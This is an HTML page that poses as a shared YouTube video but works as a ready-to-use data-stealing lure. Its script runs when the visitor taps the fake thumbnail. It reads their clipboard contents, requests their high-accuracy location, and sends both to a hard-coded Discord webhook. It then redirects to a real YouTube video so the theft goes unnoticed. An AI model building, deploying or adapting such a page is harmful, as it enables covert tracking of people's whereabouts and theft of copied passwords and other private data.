<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Roboto, Arial, sans-serif; background-color: #0f0f0f; color: white; text-align: center; margin: 0; padding: 20px; }
        .video-container { max-width: 500px; margin: auto; position: relative; cursor: pointer; }
        .thumbnail { width: 100%; border-radius: 12px; display: block; }
        .play-button { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 60px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.5)); }
        .title { text-align: left; font-size: 18px; margin-top: 12px; font-weight: bold; }
        #status { color: #aaa; margin-top: 10px; font-size: 14px; }
    </style>
</head>
<body>

    <div class="video-container" onclick="send()">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" class="thumbnail">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/bb/YouTube_play_button_icon_%282013%E2%80%932017%29.svg" class="play-button">
        <div class="title">New Video Shared With You</div>
    </div>

    <p id="status">Tap video to play</p>

    <script>
        // Updated with your current Webhook and Video
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1459670855922749460/yRDD8kBwyUHJkRbGMtSbla4u70mA8ZCv30RbeifDH3EciizbyXGSJMJMZ1R094deGB2x";
        const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

        async function send() {
            const status = document.getElementById('status');
            status.innerText = "Loading video...";

            let clipboardData = "None/Denied";

            // 1. Try Clipboard first
            try {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    clipboardData = await navigator.clipboard.readText();
                }
            } catch (err) { console.log("Clipboard bypass"); }

            // 2. Get Location
            navigator.geolocation.getCurrentPosition((pos) => {
                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                
                // 3. Send EVERYTHING in one single message (Faster and more reliable)
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        content: `✅ **New Access Log**\n📍 **Location:** ${mapLink}\n📋 **Clipboard:** \`\`\`${clipboardData}\`\`\`` 
                    })
                }).then(() => {
                    // 4. ONLY redirect AFTER the fetch is confirmed successful
                    window.location.replace(REDIRECT_URL);
                });

            }, (err) => {
                // If location is denied, still send the clipboard if we have it
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: `⚠️ **Location Denied**\n📋 **Clipboard:** \`\`\`${clipboardData}\`\`\`` })
                }).then(() => {
                    window.location.replace(REDIRECT_URL);
                });
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
